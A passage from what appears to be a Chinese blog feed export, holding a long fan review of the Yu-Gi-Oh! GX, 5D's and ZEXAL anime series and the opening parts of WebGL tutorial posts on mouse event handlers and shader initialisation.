Judai</h4><p><s>Gotcha!</s><br><s>真正的英雄不需要朋友。</s></p><p>十代是几代主角里的一个异类，有着看起来不怎么会打牌的发型，唯一和背后灵从BE转HE的路线。相比于游戏和王样和朋友的羁绊，游星的5DS和过去满足队的友情，游马的后宫<s>教徒</s>，十代唯一称得上挚友的只有约翰了。女主是花瓶，所谓的“朋友”们全是拖油瓶，一个能打的都没有。</p><p>GX初期刚入学的十代，天真自信，相信决斗的快乐，即使输给了凯撒也没有感到沮丧。异次元篇后，遭遇同伴的不理解与指责，另一个人格出现的自己又亲手杀死了同伴，之后又和尤贝尔的灵魂的超融合，再次回到决斗学院后，失去了笑容(甚至头顶的呆毛都消失了)，萌生了退学的想法。同伴们虽然在他回来之前怀念他，但似乎没有人真正理解他的，明日香评价他神出鬼没，像是风一样。</p><p>有几个细节让我觉得他非常离群而孤独——异次元篇后，欧西里斯红宿舍只剩下他一个人，他拒绝晋升；校长的毕业讲话上，优秀毕业生是他的其他几个同伴，他很安静地鼓掌，这里让我觉得他太悲情了，明明其他人什么都没有做，拼上了性命去打败敌人的是他，但英雄的勋章并不属于他，而他也接受了这种命运。</p><p>darkness篇就更搞笑了，十代因为内心感到与他人的疏离而决定离开决斗学院，然而因为darkness的来袭和校长和斋王的挽留，被迫留在了学院，再一次拯救世界。毕业前，明日香找他告白，他装作没听懂。毕业典礼离开时，他跟尤贝尔说“没什么好告别的”。我说不出话了……英雄注定孤独？</p><p>一个异类的主角，外热内冷，后期虚假的社交笑暗示了内心的重重樊篱，他性格的缺陷犹如一种映照现实的真实，这也或许是那么多人喜欢他的原因吧。</p><p>  </p><h4 id="尤贝尔-yubel"><a class="markdownIt-Anchor" href="#尤贝尔-yubel"></a> 尤贝尔 Yubel</h4><p><s>尤贝尔的性别是尤贝尔</s><br><s>让你痛苦，这是想告诉你我有多么爱你</s><br>非常病和克系的一个人物，对曾经小学生时期的我的三观起了错误的引导作用(所以我后来还挺喜欢我妻由乃的<s>人外也很喜欢</s>)</p><p>虽然我现在也很喜欢尤贝尔，但没有童年的时候那么狂热了。大概是愚蠢的成年人越来越善于隐藏自己的感情了(不是</p><p>尤贝尔的病来自于上一世十代对他的承诺和这一世被十代亲自送上宇宙的痛苦，去掉外界影响后，他自身的真实性格有点毒舌又忠犬的感觉，不过还是有点病病的。</p><p>本来想解析一下自己为什么喜欢Yubel，但是想来想去感觉很难阐述，既有他本身人格的一些原因，又有他和十代之间那种羁绊感动我的关系，还有一些微妙的感觉。童年的一些情感已经很难再直率而真诚地表达了，不过有些直觉和偏爱会始终在潜意识存在。</p><p>热血少年漫的主角在结局最后成长成大人，踏上孤独的旅途，只有另一个孤独的灵魂陪伴着他。</p><p><a href="https://www.bilibili.com/video/av19293417" target="_blank" rel="noopener">什么叫十尤十圣经·旧约啊</a></p><p><a href="https://www.bilibili.com/video/av84439157" target="_blank" rel="noopener">什么叫十尤十圣经·新约啊</a></p><p>  </p><h3 id="5ds"><a class="markdownIt-Anchor" href="#5ds"></a> 5DS</h3><hr><p>补5DS前，我对实卡最后的记忆停留在了某次去少年宫玩，路过小卖部买了包卡的时候。那时候开出了我看不懂的白卡，还有让人摸不着头脑的同调召唤。不过不妨碍我觉得白卡的龙还挺好看的，虽然同调召唤对那时候的我来说是十分高深的东西。</p><p>补5DS前，我像大多数初代二代遗老一样，停留在童年的情怀里，保持着DM/GX最牛逼的信念，没有补系列番的想法。但是看lofter时，发现了一些太太的六代系列漫画，突然就get了蟹哥的萌点，在一群搞事海星/天然黑水母/傻孩子龙虾/决带笑番茄/紧身衣冷漠工具人之间显得无比伟光正无害正直与可靠。加上星尘龙逼格高，还有什么不得了的流天类星龙，这么中二的名字，本龙癌蠢蠢欲动。</p><p>于是就开始了5DS的补番之旅。5DS的Riding duel一直是被人诟病的一点，很多人不能接受骑乘决斗，我一开始也觉得莫名其妙，为什么要无缘无故引入一张场地魔法和高速计数器，还把魔法卡限制于sp魔法卡，不过因为影响没有特别大，充其量可以看成村规，于是也没有特别反感。后来随着我追番下去，我逐渐思考，站立式决斗是前两代的主流，而5DS可能想做一些时髦值方面的尝试，于是引入了Riding duel，但莫名其妙的Riding必须要和决斗有关才站得住脚，于是又引入了场地魔法方面的机制，到WRGP的时候，可以看到这个机制又被完善了，高速世界升级成了2，先攻由第一个进入弯道的人决定这是一期就有的内容(不过到了WRGP把它作为规则固定下来了)，还有开车速度影响高速计数器的数量，甚至来不及交接时甚至会导致比赛的失败。这么一看，Riding duel是有它自己的一套完整的机制的，而且游戏性也确实存在，时髦值也upup。一开始大家对骑乘决斗的歧视，可能是不了解它后面那一套比较完善的与决斗有关的规则，以为只是与决斗无关的没有意义的尴尬设定。而且可以看到，到了剧情后期，同调召唤的进化甚至和车速挂钩了，要是没车，你很难想象蟹哥一个人飘在宇宙里召唤流天类星龙的画面。总之补完番，我推翻了自己原先对Riding duel的偏见，这确实是一个成功并且时髦的设定，在蟹哥的人设，蟹秋感情的进展，结局的各奔东西处都发挥了很多作用。</p><p>可能是主角性格影响与奠定故事基调的关系，和DM的不断寻求真相(不是很了解，感觉是这样)，GX的十代从天真走向成熟这两个主线比起来，5DS更多是一种正统的青年向热血拯救世界的故事，没有少年向的那种狼狈与跌宕起伏。蟹哥一直很成熟，没有十代的那种明显的失落回归又成长的心路历程，遭受打击最大的也不过是差点败在鬼柳那里和普拉西多的同调封印。蟹哥从头到尾决斗一直很强，你很难看出他进步了什么地方(除了同调到加速同调再到明镜止水之心这种印卡技术的进步)，感觉第一集就是完全体了。反观十代与ZEXAL的教主，十代一开始的决定构成十分简单，人也很天真，基本是不带脑子快乐打牌，快乐就完事了。教主就更别说了，前几话差点没被人喷死渣操，他们两人都有一个明显的成长历程。蟹哥一直很稳，除了回忆杀输给杰克(这是剧情杀吧我觉得)，牌组很给力(世界冠军卡组)，技术很给力，一串三不在话下，会说书会嘴炮会脑内combo。而且蟹哥的队友们也暖心(十代：我做错了什么？)，所以5DS的剧情也是那种很稳定的发展。我追番时也会感觉到一个很明确的主线任务，主角们稳定地向那里迈进，一般没有多少神转折，各个篇章的内容重量也还算均衡，但你看GX，异次元篇的突兀和沉重，ZEXAL第二季的超展开，5DS蟹哥相比起来就是一个靠谱的成年男性。追番的时候我心情一直是比较平稳的，没有大悲大喜，很安定地期待着故事进行。唯一一次哭大概是结尾的时候，5DS展现了现实的成人世界，所有人的人生并不会天真地以决斗为中心，曾经的同伴们也将各奔东西，如果它只展示到这里就好了，我可能就不会哭了，因为老套而不落俗的少年故事大多都是这样结尾，相当于虚幻的开放式结局，未来任凭美好地想象。但它偏偏要中间倒叙插入一段多年后大家的生活，成为了医生、国外留学、退出职业赛队、成为个人决斗者、留在原点继续研究，这样的真实而不同的人生，我明明是想补番来逃避现实的，结果又提醒我想起了现实，就好像在告诉我，你看，再中二的记忆都会成为过去，你的生活终将抛弃以娱乐为中心的构成，你要去面对、去拥抱现实。大概是这样的有点真实的残酷，对死宅来说。传递了它作为非子供向动画的一些价值内容。</p><p>作为偏成人向的内容，5DS的故事平稳，但平稳有时意味着容易倦怠，所幸它的人设与决斗构成十分优秀，蟹哥就不说了，之后单独分析。杰克从一开始的中二之王转向后期的谐星担当，这个过程发生的事情十分有趣，一开始我以为他是社长那种风格的，毕竟长得也有点像，但后来各种翻车、乱花乌鸦麻麻的钱233、孩子王属性，还有和小丑的拉面故事发生共鸣感动的那一段，都让这个人物的塑造变得多面立体而有趣，而且他是个固执得有点Baka的家伙，结局处是他那种天真而固执的对梦想的追求点醒了所有人，那一段关于理性与羁绊的发言真的相当有特色并且很有趣。克罗，或者叫他乌鸦，因为人物塑造得太好导致人气太高，硬生生逼迫剧本把他从边缘人物提升到男二地位，5DS变成6DS，乌鸦应该是这一代放水最多的人了吧，装鶸放水的迫真演技真的太可爱太吸粉了，而且性格很可爱，布鲁诺刚来时吃醋那一段我笑死了。十六夜秋，本作女主，也是六代YGO最能打的女主(甚至可能是人气最高的我猜)，黑蔷薇龙强无敌，曾经是一代炸场神器，某种意义上她可能是乌鸦戏份改变的牺牲品？(我猜的)这么吸粉的黑蔷薇龙竟然没有进化体。也可能是直男编剧的锅，前期魔女形象塑造的很好，后来洗白后也很可，但是戏份后面(决斗方面)真的太路人了，基本就WRGP上场了一次，还是辅助的那种。前期你塑造了那么久的黑蔷薇龙和魔女形象，后期怎么就不知道用一下啊，辣鸡编剧。这个有点意难平。虽然相比起其他几部女人局外人-战五渣-工具人等形象要好得多，但YGO系列的女性人物真的让人吐槽，过于平面刻板，即便是第四部说出了“只把女性作为学会饰物的人们而已”这样让人感慨YGO终于想摆脱性别刻板印象了的神代璃绪，也还是回到了被绑架-让人来救-再次被绑架-让人来救这样的工具人套路当中，令人无语凝噎。除了这个之外倒还好，只是这一点瑕疵实在有点可惜。后期天降的布鲁诺让我想到了十代的约翰，发色发型都有点像，而且是很讨喜的弱气和天然黑的属性。<s>但是死得太剧情杀了，我不接受，蟹布szd。</s></p><p>5DS的决斗构成我真心觉得超神，首先可能是同调召唤本身时髦值加成的关系，比起亏卡亏到死的仪式和融合需要不断想方设法补充手卡，同调不需要这个刻意的剧情点，就减少了说书的冗余，提升了说书的技术含量。再接着，召唤词这个想法太时髦了，加上这部是K社龙癌发作的一部作品，召唤词+龙那是时髦值MAX啊，有多少人不会同调召唤但会背星嫁的召唤词的，这就好像白嫁是社长的信仰一样，召唤词就是说书的灵魂所在。</p><blockquote><p>聚集的祈愿将成为新生的闪耀之星，化作光芒闪耀的道路吧！同调召唤！飞翔吧，星尘龙！</p></blockquote><p>虽然早期蟹哥的决斗有重复套路的嫌疑(过劳死罢工抗议)，但到了后期，各种效果连锁陷阱连锁无效连锁，脑内combo，出场大量的特效加成，Riding的疾驰刺激感，场地魔法效果的各种利用与反击，都让决斗构成的复杂性和观赏性上升了一大截。V6作哥也说书，但繁长的过于贴近OCG环境的说书(我看过一个作哥单回合5min的说书cut！5min？！！)让人昏昏欲睡，而5DS在说书和决斗构成间找到了平衡点。虽然DM之后所有续作都被笑称为卖卡作，但即使卖卡也应该有诚意，我觉得其他几部兄弟作品应该向5DS学学，不要一味地推超模卡，好歹跟剧情联系紧密一点吧。我看了蟹哥的说书，我就很想买魂卡星嫁，我也很想中二地念召唤词，组一套废二。(最近很喜欢黑羽，在dl上艰难地抽黑羽)</p><p>如果说GX主推的是与卡牌的羁绊，那5DS主推的就是伙伴之间的羁绊，蟹哥的队友真的都好棒，这种燃系热血番如果只靠主角一个人推怪是很没意思的，但是5DS做到了主角和同伴一起前进，无论是打暗印者也好，WRGP组队也好，弧线摇篮篇三个方向的推进也好，每个人都能在主线任务中献出力量，这也能更好地塑造角色自身的形象。最后蟹哥召唤流天那里，所有的龙出现，聚集成新的力量，简直是教科书式的燃。</p><p>总之整个5DS看下来，感觉就是稳、完整，私心觉得同调是历代最时髦的召唤方式。如果除去情怀的加成，5DS称得上前三代最佳，DM败于那个年代的画质影响，还有刚开始探索这块TCG领域时规则方面的欠缺和口胡，GX败于剧情上各篇章之间的撕裂感、前期灌水有点多、特效也没有5DS良心，5DS在决斗方面做到了最好，开创了辉煌的同调时代，一回合三流天的梗大概是很多牌佬的青春？5DS相比这两代欠缺的可能是剧情上的跌宕起伏，但他确实讲好了一个故事，没有大的瑕疵。</p><p>不过5DS也有一些地方值得吐槽。虽说是5DS，到了后期成了6DS，前期第五条龙一直神隐，生命激流龙从ED1就出现了(life is beautiful这个名字太草了)，一直打酱油到了快结局才出现，改剧本改得太明显了。剧本的更改使得设定出现bug，黑羽龙的加入一直没有交代清楚原由，好歹把设定圆回来吧，还有红龙多出来的那个萝卜真是槽多无口。杰克和卡莉的感情线也是，暗印篇爱得要死要活，复活后仿佛失忆，仿佛什么都没发生过？真实意难平。秋姐后期的路人感吐槽过了。杰克的红莲新星龙的背景设定也有点随意，与其设定一个新的神，为什么不干脆深挖一下原有的红莲魔龙这条线呢？5DS动不动5000年10000年的追溯，你不是和DMGX一个时间线的吗，哪来的那么多妖魔鬼怪。</p><p>以及，5DS的作画是一个大问题，隔几话大崩一次，各位作监之间的风格差距有点大，非常明显的一点就是有几个作监那个脸上的黑线一大片一大片的，我觉得你用黑线表示阴影可以，但不要这么滥用吧？或者你们风格能不能统一一下，一话全是黑线，然后下一话又变回清秀小美人，迷惑。以及邪神作画大量出没，我这个从来不关注作监的人，从补5DS开始也有了看每话作监的意识。那个大邪神、崩坏担保，说的就是你，高桥和德，为啥DM时期和加加美的风评那么好，到了5DS就是崩坏担保了，你很难看到他不崩坏的部分，各种奇怪的表情、人体结构大量出没。不只是高桥和德，一大批作监都有崩坏的陋习，作画一点都不稳定。这算是我最不喜欢5DS的地方了。</p><p>对了，还有一个我觉得有点不爽的地方，5DS中断的决斗有点多，导致原本铺垫得很好的局势虎头蛇尾。又或者是一些决斗打到后期，敌人忽然被洗白或者自我醒悟，然后表现出一种甘愿认输的倾向，比如和暗印者里那个姐姐打，后期就感觉很奇怪，实力一下子掉档。</p><p>关于音乐方面，我印象深的倒不是很多，即使是蟹哥的clear mind，我也没什么感觉，倒是觉得蟹哥的处刑曲更燃一点。</p><p>整体差不多吐槽到这里，可能是因为刚看完没多久，一不小心爆字数了，我对5DS真是爱得深沉。</p><p>  </p><h4 id="不动游星-fudo-yusei"><a class="markdownIt-Anchor" href="#不动游星-fudo-yusei"></a> 不动游星 Fudo Yusei</h4><p>蟹哥名字的发音跟武藤游戏真的好像，不知道是不是故意的。</p><p>蟹哥一开始的人设很无口，满脸写着冷漠，一话除了决斗讲不了几句话，差点就成了后来的作哥了，也可能是cv刚上手的关系。后来到了克罗出场那一话，蟹哥一下子变得炒鸡开朗，果然这就是基友的力量吗。还有5DS满足队这个设定真的超搞笑，每次回忆杀的时候都是满屏幕的“黑历史”和“羞耻”，为什么你们不会笑出来啊我真是笑得捶床了哈哈哈哈。除了无口蟹，还有进了酒吧点了杯牛奶的milk蟹(后来zexal里的阿里特干了同样的事情)，被捆绑电击的SM蟹(这就是你的本子比女主多的原因？)，打架超厉害·一拳两三个·蟹升拳·蟹(论历代最会打架的男主)。后来的蟹哥逐渐失去了无口这个最开始的设定，变得话多嘴炮了起来，对于我这种无口爱好者是一个遗憾。</p><p>蟹哥在同人里的设定一般都是最老实的那个人，该说不愧是靠谱的成年男性吗。蟹哥有时候有一些奇怪的坚持，呆呆的又很萌的感觉，比如和鬼柳一起挖矿那里，简直是对别扭小孩的神器。蟹哥有种天然黑的潜质，但我又觉得称不上天然黑，如果和十代比起来的话，他只是个人的经历比较丰富复杂，沦落到卫星区、在满足队当混混、后来从垃圾堆里捡零件和卡组、自学机械工程做D轮、到了新童野市还是每天忙忙碌碌地做机械和程序。他和布鲁诺熬夜写代码那一段让我觉得很亲切，两个人基本没怎么睡觉，写完了才躺下。看过一个画各代主角睡相的漫画，十代和教主是梦里还在决斗，番茄和作哥则是一直做噩梦，轮到蟹哥——还在写代码，头上一个对话框(快去睡。)，哈哈哈超好笑。总之蟹哥的经历让他显得特别成熟寡言，但又不是黑的程度，因为他自己还是那种比较正义的性格(十代不要装无辜了，天然黑的教科书就是你)。</p><p>反正就是，比起其他几代各种问题儿童，蟹哥这种乖小孩(?)会显得特别可爱，有自己独特的萌点。</p><p>  </p><p>其他人物之前提过一点了，还想补充的也不多。其他人里我最喜欢的应该是乌鸦，非常有生活感的一个人，做饭送快递当麻麻，对游星在搞的东西一窍不通那段很可爱很真实哈哈哈，也是本作的孩子王之一，小孩子们给他应援那一段很感人。以及虽然是脸上印记最多的人，意外得没有很痞。打牌比杰克这个男二靠谱，毕竟是冠军卡组黑羽吧哈哈哈。</p><p>  </p><h3 id="zexal"><a class="markdownIt-Anchor" href="#zexal"></a> ZEXAL</h3><hr><p><s>讲个笑话，ZEXAL是子供向动画</s></p><p>我是被一个剪辑视频带入ZEXAL坑的，里面剪的是游马和Astral的故事。这种跟DM和GX相似的背后灵的设定非常戳我的萌点。于是毫不犹豫地入坑了。</p><p>经历了5DS这种青年向的故事形式，ZEXAL一开始我非常不适应。可能因为是子供向的关系，官方一开始出的几话都是教学集，基础到教导你魔法卡陷阱卡等怎么用，习惯了蟹哥高端说书的我有点无力吐槽。好在我对ZEXAL的期待值很高，也知道后续剧情的展开还不错，再加上教主是历代最小的主角(13岁可以宽容)，我寻思着这应该是一个成长向的故事，类似GX那样，只不过起点比十代低，于是也就看了下去。</p><p>Astral的存在很有趣，教主是一个话多的需要倾听对象的人，所以这两个人在一起太搭了，而且游马的成长需要一个导师类型的人物。</p><p>曾经看过一个假说，DM和GX是同一个世界线，但以零点反转为分支点，分化成了5DS和ZEXAL两个时间线，一个是发生了零点反转，游星他们拯救世界和ZONE他们失败的世界线，另一个是ZONE他们成功阻止同调、抹杀零点反转的世界线，也就是ZEXAL世界观。这大概可以解释ZEXAL为什么完全没有同调召唤存在的痕迹，就连决斗庵里的代表怪兽木雕也只有DM/GX的。</p><p>ZEXAL是一个以超量为主的世界观，超量相比同调某种意义上更简单(我觉得)，只需要特定数量的相同level的怪兽就可以召唤，而同调需要至少一只具有&quot;同调&quot;属性的怪兽，而且凑星数有时候挺麻烦的，而超量完全可以构造一副纯R3或R4的卡组，卡组构筑方面我觉得相对简单一点(菜鸡玩家发言)。比起同调而言超量确实更容易理解。以及和之前任何一种召唤方式都不同的是，作为超量召唤的素材会叠放在超量怪兽下，一开始我在ygopro里碰见这种放卡方式的时候超疑惑的，不过理解之后还是挺简单的。就动画初期超量的表现来看，我觉得超量素材是超量的一个很大的限制因素，一些怪兽用完素材之后就变成白板没有效果了，给人感觉强度上好像不如同调。</p><p>先讲讲我对ZEXAL决斗构成的感想好了，一开始出于教学的关系，开头几场的决斗构成都很简单，我觉得把鲨鱼作为第一个被教主打败的人是个败笔，怎么说也是个亚军，被一个刚学决斗的菜鸡给打败了，后面每次都是根据剧情需要让鲨鱼赢或输，完全看不出这个人真实的决斗水平到底是怎样(鲨鱼真实工具人)。后来快斗出场，快斗大概是亲儿子，决斗水平从开始就保持在一流水准，到结局都没输过教主。值得吐槽的是快斗的卡组，每次基本都是一开始就上光嫁，是在向社长致敬吗？R8的银河眼也是说来就来。出于一个菜鸡玩家的感受，5DS和ZEXAL的卡效果差距过大，感觉ZEXAL动不动就出超模卡。相比于5DS比较多的连锁，感觉ZEXAL更多时候是靠卡效碾压。而且有一个值得诟病的地方，感觉后期的敌方怪效果有一万个字，发完一个又一个，flag倒一个又立一个，根本记不住，如果OCG化卡面真的写的下吗，最后还不是砍了一堆？感觉完全是为了塑造敌方的强大形象而塞了那么多效果，但这根本不是决斗啊？过于超模和繁琐的效果导致我看ZEXAL决斗的兴趣不大。最后决斗往往会变成两边互相印卡，说到印卡，我觉得教主的ZEXAL模式槽点太多了，闪光印卡要不要太嚣张啊(特别是那个台词，balabala什么最强决斗者的一切都是必然的)，5DS好歹也就印几张额外吧。教主印卡就算了，和贝库塔打的那场直接改卡(住手，这根本不是决斗！)，我觉得是和ARCV的动作卡一样洗不白的黑点。游戏王本身的主要构成就是决斗，在决斗里印卡改卡无异于破坏游戏规则，直接消耗了观众热情啊。</p><p>我觉得导致教主频繁印卡的一个直接原因就是他自己的卡组本身强度太低，如果不用A娘的卡，自己连一张超量怪都没有(虽然结局的时候自己印了张No.0)，强力的卡都是印出来的而且也不归自己，史上最弱主角卡组钦定。而你看看蟹哥的，不印卡之前就有一只星尘龙和其他一堆过劳死同调怪，而且效果都还不错，起点就比教主高很多。而失去了No的教主卡组就是一条咸鱼，最后和A娘打就变成拿一堆咸鱼各种苟，感觉观赏性很差，时髦值downdown。</p><p>总之我自己确实不太喜欢ZEXAL的决斗部分，好在这一部吸引我的也不是决斗，有时候打个盹进度条一拖也就过去了。下面来讲讲剧情好了。ZEXAL第一季的剧情主要是围绕WDC展开，快斗在这一季应该是当之无愧的男二吧，鲨鱼这一季的实力和存在感还没那么强。WDC开始前有一些日常的搜集No的剧情，快斗在这一部分刷足了前期作为反派的时髦感，然后冷漠的人设与弟弟面前那个温柔的弟控相互映衬，人物形象一下子就立体了。这中间还有很多教主攻略别人的决斗(。)，为大后期这群人送死做铺垫(。)。WDC决赛开始前，玉座一家的出场的剧情是高潮部分，这部分剧情把快斗和鲨鱼都牵扯了进来，玉座家三兄弟的人设也很有趣。而且玉座一家、快斗一家、游马一家、以及鲨鱼兄妹，这些人之间的贵乱关系真是相当错综复杂。等到打进WDC，虽然玉座等人的各种卡效果爆炸，打牌打起来还是挺好看的。教主打牌打着打着顺便把快斗也攻略了(。第一季末尾1V3那场也还可以，就是感觉ZEXAL的多对一规则对人少的那个不公平，卡差太大了，还是超融合剧场版规则公平一点。总之第一季就在快斗愉快地暴打教主后(被攻略后)结束了。</p><p>总体来看，第一季前期为了铺垫人物出场等做的过家家日常有点无聊，中期虽然主线逐渐展开，一些插入的日常表现也不是特别优秀，等到突入WDC后，节奏才开始变得紧张。总而言之中规中矩。</p><p>第二季开始进入巴利安节奏，影帝真月零加入队伍。总之一路高能，从这里开始决斗就开始变得可能会死人了。96颜艺巅峰，138我哭了好几次。中间还经历了Astral的“死亡”，教主那一段自闭看得我太痛苦了。不知道是不是我的错觉，教主快黑化的时候瞳色会从鲜红色变得暗红，非常黯淡血腥凝固的红色，虐死我了。我总感觉教主要走上十代的老路，但还好教主是那种积极抗压的性格，虽然后面伙伴一直在死去(快斗shark你们死得好惨啊)，教主也一直哭一直哭，但至少坚持下来扛过来了，身边几乎所有人死去的痛苦，承受着这样的命运还是没有黑化，教主和十代果然是不同的人啊。如果说GX后期是用所有角色形象的葬送来塑造一个十代，那么ZEXAL后期就是所有角色自愿用自己的死亡来让游马成长。</p><p>印象特别深的是快斗临死前对游马说的话：</p><blockquote><p>游马，好好记住，谁都会面临分别，总会有一天，突然的，你和Astral也不例外。因此，先从和我分别开始适应起来吧。</p></blockquote><p>啊，文艺的大斗哥也擅长发刀啊。</p><p>还有138的贝裤衩，虽然因为你欺负教主，我超级超级超级讨厌你，不过这一集就原谅你一次：</p><blockquote><p>到底要多老好人啊，真蠢。我没法拖你一起走。<br>永别了，游马同学。</p></blockquote><p>不得不说，这样的死亡也升华了这些人物，而GX里对应的则是人物的全盘崩塌。ZEXAL是一场涅槃重生，GX就是为了成全一个人的献祭。</p><p>最后的结局是教主和A娘的对决，Astral看穿了教主失去朋友的悲伤，但是教主不愿意动用源数代码去改动世界线，所以A娘扮演反派挑起与游马的决斗。决斗的主题到最后揭示出来也是与GX类似的，不要忘记决斗的快乐。最后世界线变动，差点成为遗像子供番的ZEXAL终于迎来了一个HE。虽然很多太太都很悲伤地觉得HE没有这么容易得到，这是Astral伪造的一个梦境或者需要Yuma付出什么才能得到，不过我也不多想了，我愿意相信这个HE。谁还不是爱吃糖的成年人呢TUT</p><p>虽然ZEXAL的决斗构成在我看来是残废，但是剧情跌宕起伏够深黑残(我吃刀子吃得很开心(吐血))，游马虽然只有13岁但是展现了圣子般的光辉(非贬义)，教主这个称号当之无愧。熬过前期小白日常剧情，ZEXAL与5DS相比，也有它的独特闪光之处。</p><p>吹完了剧情，让我再来婊婊ZEXAL。ZEXAL有一个非常大的剧情硬伤，也是让很多人诟病的一点，角色洗白得太突然了。前期铺垫了那么久的菲卡BOSS，用尽各种手段和角度展现他的无情冷漠一心向科学，突然被打败后就变成了一心为小儿子的慈父，毫无逻辑，与前面剧情矛盾成山，为洗白而洗白也太恶心了，呕呕。玉座的洗白不予评论，我只是觉得他救人那里干嘛要表现得那么像坏人，编剧你以为突然变白可以给观众带来惊喜吗，呕呕。贝库塔这个人物有点复杂，不过我觉得他没洗白。</p><p>小鸟女主的大正宫地位不可动摇，但编剧你不要因为她是女主就让她到哪里都跟着呀，就这么缺一个解说役吗！而且仗着不会打牌就不会死人，所以连巴利安世界都让她跟着去啊？！认真的吗？！我前半句是吐槽呀！虽然小鸟真的很可爱，但是打的很危险的地方站着一个不会打牌的女孩子还在一边解说真的有点出戏呀！</p><p>以及，不知是不是因为子供向的原因，ZEXAL的风格是真的幼齿啊，教主不明所以的发型…像极了小学生爱看的动画片的男主(讲道理那些男主的发型也比教主好看吧)。所幸教主个人魅力克服了这个缺点。其实我也不怎么喜欢鲨鱼的发型，感觉美颜被这个章鱼发型耽误了。以及ZEXAL的配色，教主的一帮初中同学的人设——小鸟绿油油的发型，cat好像可爱又好像不可爱的外型，胖虎和小夫就不说了(bushi)……城市的配色也是各种高饱和度混杂的幼齿审美。</p><p>不过相比5DS各种作画邪神出没，ZEXAL的原画是真的好！很少看到崩坏的作画，而且我还发掘了一个神仙作监太太——横田明美女神！她笔下的人物，特别是斗哥，又帅又美，而且可能因为是女性审美的关系，她的人物都会偏向圆润可爱(比如这篇文章封头的三妹！)，但也不会缺乏帅气！而且很少看到过于夸张的兄贵。像ngb虽然也被夸作画完美，但他有点偏向肌肉兄贵的男性审美，这部还不是特别明显，到了作哥那一代，感觉作哥虽然是个美人，但是是一个可以一拳打飞十个我的大美人，奇怪的感觉呢……不是我很能接受的风格。可惜横田太太在v6只负责到40多集就跑到另一个番打工去了，对v6真是一个大损失啊。</p><p>ZEXAL也有两首我特别喜欢的歌曲，一首是OP2&lt;BRAVING!&gt;，非常燃的一首歌。还有一首是最后一个ED<challenge the game>，也是官方御用送葬曲。因为这个ED正值ZEXAL死人最多的时候，当话死的人都会被剪辑一番之前的出场，替换原先的ED画面，官方送葬，官方飞刀，刀刀见血。每次听到这首歌都会有点丧。(小美人们你们死得好惨啊5555)</challenge></p><p>  </p><h4 id="九十九游马-tsukumo-yuma"><a class="markdownIt-Anchor" href="#九十九游马-tsukumo-yuma"></a> 九十九游马 Tsukumo Yuma</h4><p><s>一飞冲天啊，我！</s></p><p>13岁！历代最小的决斗王！(SEVENS是什么我不知道)</p><p>你以为ZEXAL是游马的成长升级故事，其实是游马的后宫攻略故事哒！</p><p>拥有全系列最大的后宫，男女通杀，连爸爸的朋友都不放过(bushi)</p><p>打住，我正经一点。</p><p>第一次见到游马，感觉这个主角不是我喜欢的类型，有着和蟹哥一样黑的肤色但没有蟹哥的帅气和无口可爱属性，发型的奇怪程度堪比武藤游戏但又完全不及人家的时髦值，明明是和十代一样的“不动脑子”快乐决斗玩家，真的打起来却蠢爆了。总之第一印象，你真的是主角吗？给我A娘让个位置谢谢。</p><p>奇怪的口头禅“一飞冲天”，这个cv的声音念这句真的感觉怪怪的，有种出戏感。</p><p>游马一开始并不是完全的正面形象，明明不会决斗，对A娘的指点不屑一顾固执己见导致失败；对恶人之心完全没有洞察力，天真幼稚得仿佛三岁小孩一骗就上钩了；明明说要不带No挑战鲨鱼，最后还是用了No，违反了自己口口声声的承诺，超掉粉啊这里，弹幕一片不屑，好多人扬言要弃番。本来也想大喷一番的本喷子看到这么多粗鄙之言，感觉游马被骂的有点可怜，这才忍住没喷。</p><p>虽然真的很想骂人，这什么**主角，但想想也很真实，毕竟他只有13岁啊，毕竟这一代是偏向成长路线的，不停催眠自己，会长大的会长大的，消气了。只不过是因为这个后辈恰好紧跟在最年长的蟹哥后面，这对比太可怜了。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ygo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤独的WebGL之旅(三) | 响应函数</title>
      <link href="/2020/01/23/webgl(3)/"/>
      <url>/2020/01/23/webgl(3)/</url>
      
        <content type="html"><![CDATA[<p>动态绘制过程中不免会用到鼠标或键盘的响应函数。之后进入三维世界，我们将通过鼠标改变场景的视角，通过键盘实现在场景中的漫游。在这一章只是先介绍一下鼠标和键盘的响应函数，等我写到三维世界，再回过头来补充具体的漫游相关。</p><a id="more"></a><p> </p><h3 id="鼠标响应"><a class="markdownIt-Anchor" href="#鼠标响应"></a> 鼠标响应</h3><hr><p>我们可以通过<code>&lt;canvas&gt;</code>对象来注册鼠标响应函数。</p><p>比如鼠标的点击事件，代码可以如下：</p><pre class="highlight"><code class="js"><span class="hljs-comment">//注册鼠标点击事件响应函数</span>canvas.onmonsedown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">ev</span>) </span>{ click(ev, gl, canvas, a_Position); };</code></pre><p>当发生鼠标点击事件时，就会调用click函数。这样的写法是匿名函数的写法，好处是可以获得main()函数内部的一些变量，比如gl, canvas等。而click()函数的实际定义是在main外部的。</p><p> </p><h3 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h3><hr><p>[1] 《WebGL Programming Guide》Kouichi Matsuda, Rodger Lea</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WebGL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孤独的WebGL之旅(二) | 着色器</title>
      <link href="/2020/01/23/webgl(2)/"/>
      <url>/2020/01/23/webgl(2)/</url>
      
        <content type="html"><![CDATA[<p>着色器作为最重要的概念之一，怎么可能只有上一章那么点内容呢。</p><p>这一章将继续深入着色器相关概念，但涉及较少的实例程序部分，后续若有深入的着色器概念，也会在这一章补上，不再分开叙述。</p><a id="more"></a><p> </p><h3 id="initshaders函数解析"><a class="markdownIt-Anchor" href="#initshaders函数解析"></a> initShaders()函数解析</h3><hr><p>initShaders()函数虽然放在了函数库里供调用使用，但如果想深入了解WebGL，内部细节还是需要了解的。其大致可分为七个部分。</p><ol><li>创建着色器对象</li></ol><p>通过gl.createShader(type)函数创建着色器对象，type参数可传入gl.VERTEX_SHADER或gl.FRAGMENT_SHADER，指定创建的着色器类型，为顶点着色器或片元着色器。可以通过gl.deleteShader(shader)来删除着色器对象，如果该着色器还在使用，则删除无效。</p><ol start="2"><li>向着色器对象中填充着色器程序的源代码</li></ol><p>通过gl.shaderSource(shader, 